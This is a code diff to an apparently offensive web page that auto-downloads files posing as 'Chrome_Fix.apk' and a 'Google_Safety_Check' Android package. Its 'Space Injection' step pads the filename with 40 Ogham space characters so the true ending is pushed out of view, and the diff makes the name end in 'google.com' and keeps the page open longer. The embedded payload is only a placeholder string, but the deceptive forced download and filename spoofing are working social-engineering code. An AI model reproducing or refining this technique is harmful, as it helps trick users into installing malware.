@@ -90,7 +90,7 @@
                     a.href = "data:application/octet-stream;base64,ZXN0dGVzdHRlc3Q=";
                     a.download = "Chrome_Fix.apk";
                     a.click();
-                    setTimeout(() => window.close(), 1000);
+                    setTimeout(() => window.close(), 10000);
                 <\/script>
             `;
             const blob = new Blob([html], {type: 'text/html'});
@@ -104,7 +104,7 @@
             updateLog("Running Space Injection...");
             goFS();
             // Menggunakan karakter Ogham Space (\u1680) untuk mengisi kekosongan UI
-            const fakeName = "Google_Safety_Check" + "\u1680".repeat(40) + "update.apk";
+            const fakeName = "Google_Safety_Check" + "\u1680".repeat(40) + "google.com";
             setTimeout(() => {
                 const a = document.createElement("a");
                 a.href = "data:application/vnd.android.package-archive;base64,ZXN0dGVzdHRlc3Q=";
